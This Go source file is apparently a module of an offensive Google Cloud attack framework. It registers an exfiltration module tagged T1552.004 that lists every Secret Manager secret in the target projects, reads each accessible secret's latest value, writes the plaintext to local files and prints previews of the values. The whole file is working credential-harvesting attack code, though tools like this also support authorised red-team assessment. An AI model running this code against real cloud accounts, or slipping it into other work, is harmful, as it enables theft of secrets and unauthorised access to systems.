package secrets

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	secretmanager "cloud.google.com/go/secretmanager/apiv1"
	"cloud.google.com/go/secretmanager/apiv1/secretmanagerpb"
	"google.golang.org/api/iterator"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&DumpValues{})
}

// DumpValues reads and saves all accessible secret values.
type DumpValues struct{}

func (m *DumpValues) Info() module.Info {
	return module.Info{
		Name:         "exfil.secrets.dump-values",
		Tactic:       module.TacticExfil,
		Service:      "secretmanager",
		Description:  "Read and dump all accessible secret values to local files",
		RequiresAuth: true,
		Concurrent:   true,
		AttackID:     "T1552.004",
	}
}

func (m *DumpValues) Run(ctx module.RunContext) error {
	if len(ctx.Projects) == 0 {
		output.Warn("No projects specified.")
		return nil
	}

	client, err := secretmanager.NewClient(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create secretmanager client: %w", err)
	}
	defer client.Close()

	outputDir := ctx.Flags["output"]
	if outputDir == "" {
		outputDir = "exfil/secrets"
	}

	for _, project := range ctx.Projects {
		output.Info("Dumping secrets in project: %s", project)

		projDir := filepath.Join(outputDir, project)
		os.MkdirAll(projDir, 0o755)

		it := client.ListSecrets(context.Background(), &secretmanagerpb.ListSecretsRequest{
			Parent: fmt.Sprintf("projects/%s", project),
		})

		accessed := 0
		denied := 0
		total := 0

		for {
			secret, err := it.Next()
			if err == iterator.Done {
				break
			}
			if err != nil {
				output.Error("List secrets in %s: %v", project, err)
				break
			}
			total++

			// Try to access the latest version.
			result, err := client.AccessSecretVersion(context.Background(), &secretmanagerpb.AccessSecretVersionRequest{
				Name: secret.Name + "/versions/latest",
			})
			if err != nil {
				denied++
				if ctx.Verbose {
					output.Error("  Access denied: %s", shortSecretName(secret.Name))
				}
				continue
			}

			accessed++
			secretName := shortSecretName(secret.Name)
			safeName := strings.ReplaceAll(secretName, "/", "_")
			outPath := filepath.Join(projDir, safeName+".txt")

			if err := os.WriteFile(outPath, result.Payload.Data, 0o600); err != nil {
				output.Error("  Write %s: %v", outPath, err)
				continue
			}

			preview := string(result.Payload.Data)
			if len(preview) > 80 {
				preview = preview[:80] + "..."
			}
			// Mask the value in output unless verbose.
			if ctx.Verbose {
				output.Success("  %s -> %s", secretName, outPath)
				fmt.Printf("    Value: %s\n", preview)
			} else {
				output.Success("  %s -> %s (%d bytes)", secretName, outPath, len(result.Payload.Data))
			}
		}

		if total == 0 {
			output.Info("No secrets found in %s", project)
			continue
		}

		output.Success("Project %s: %d/%d secrets accessible, %d denied", project, accessed, total, denied)

		if accessed > 0 && ctx.Findings != nil {
			ctx.Findings <- module.Finding{
				Module:      "exfil.secrets.dump-values",
				Severity:    module.SevCritical,
				Title:       "Secret values exfiltrated",
				Description: fmt.Sprintf("Read %d/%d secrets from project %s, saved to %s", accessed, total, project, projDir),
				Project:     project,
				Data:        map[string]any{"accessed": accessed, "total": total, "denied": denied},
			}
		}
	}

	return nil
}

func shortSecretName(name string) string {
	parts := strings.Split(name, "/")
	if len(parts) >= 4 {
		return parts[len(parts)-1]
	}
	return name
}
